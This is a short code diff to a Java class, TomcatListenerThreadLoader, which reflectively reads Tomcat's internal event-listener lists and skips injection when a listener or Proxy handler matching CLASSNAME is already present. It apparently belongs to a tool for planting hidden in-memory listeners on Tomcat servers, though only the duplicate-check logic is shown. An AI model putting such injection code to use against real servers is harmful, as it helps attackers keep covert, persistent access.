@@ -56,7 +56,7 @@ public class TomcatListenerThreadLoader {
         try {
             applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
             for (int i = 0; i < applicationEventListeners.size(); i++) {
-                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
+                if (applicationEventListeners.get(i).getClass().getName().contains(CLASSNAME)) {
                     return;
                 }
             }
@@ -67,15 +67,8 @@ public class TomcatListenerThreadLoader {
         try {
             applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
             for (int i = 0; i < applicationEventListenersObjects.length; i++) {
-                Object applicationEventListenersObject = applicationEventListenersObjects[i];
-                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
-                    Object h = getFieldValue(applicationEventListenersObject, "h");
-                    Object h2 = getFieldValue(object, "h");
-                    if (h.getClass().getName().contains(h2.getClass().getName())) {
-                        return;
-                    }
-                } else {
-                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
+                if (applicationEventListenersObjects[i] instanceof Proxy) {
+                    if (getFieldValue(applicationEventListenersObjects[i], "h").getClass().getName().equalsIgnoreCase(CLASSNAME)) {
                         return;
                     }
                 }
